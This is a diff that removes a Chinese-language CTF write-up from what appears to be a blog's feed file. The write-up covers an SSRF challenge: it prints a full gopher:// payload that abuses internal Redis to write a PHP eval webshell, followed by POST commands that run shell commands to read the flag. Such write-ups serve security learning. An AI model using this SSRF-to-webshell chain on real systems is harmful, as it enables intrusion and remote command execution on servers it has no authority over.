@@ -247,33 +247,6 @@
     
     
     <entry>
-      <title>ssrfme</title>
-      <link href="/posts/ssrfme/"/>
-      <url>/posts/ssrfme/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一段php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init(); <span class="comment">// 创建一个cURL资源</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">        curl_exec(<span class="variable">$ch</span>);<span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">        curl_close(<span class="variable">$ch</span>); <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p><strong>利用gopher协议无密码注入mysql</strong></p><p>使用<a href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>构造payload，本质是SSRF+RCE</p><p>此工具需要安装两个包，并且用python2，Windows和Linux均可</p><p><strong>Redis协议</strong></p><blockquote><p>python2 gopherus.py –exploit redis</p></blockquote><p>工具使用如下：</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302247274.png" alt="image-20220930224743198"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\lenovo\Desktop\Gopherus-master&gt; python2 gopherus.py --exploit redis</span><br><span class="line">What do you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line">Give web root location of server (default is /var/www/html):// 默认地址，直接回车</span><br><span class="line">Give PHP Payload (We have default PHP Shell): select &quot;&lt;?php eval($_POST[cmd]); ?&gt;&quot; into outfile &quot;/var/www/html/cmd.php&quot;; // 写入一句话木马</span><br><span class="line">Your gopher link is Ready to get PHP Shell:xxxxxxxxxx // 生成payload</span><br></pre></td></tr></table></figure><p>记得对生成的payload再进行一次URL编码，因为GET会进行一次解码，curl也会进行一次解码</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.1.5.252:28102/?url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252478%250D%250A%250A%250Aselect%2520%2522%253C%253Fphp%2520eval%2528%2524_POST%255Bcmd%255D%2529%253B%2520%253F%253E%2522%2520into%2520outfile%2520%2522/var/www/html/cmd.php%2522%253B%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure><p>shell.php成功写入，访问<code>/shell.php</code>，再进行远程命令执行（RCE）即可获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[POST]payload：cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">[POST]payload：cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p>或者用蚁剑连接，密码：cmd</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302247675.png" alt="image-20220930224752644"></p><p>在根目录下的qaq文件里找到flag</p><h2 id="知识点-gopher协议"><a href="#知识点-gopher协议" class="headerlink" title="知识点(gopher协议)"></a>知识点(gopher协议)</h2><p>在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法与http协议类似。<br>不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&amp;分隔符也要进行url编码<br>基本协议格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Web_php_include(攻防世界)</title>
       <link href="/posts/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/"/>
       <url>/posts/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/</url>
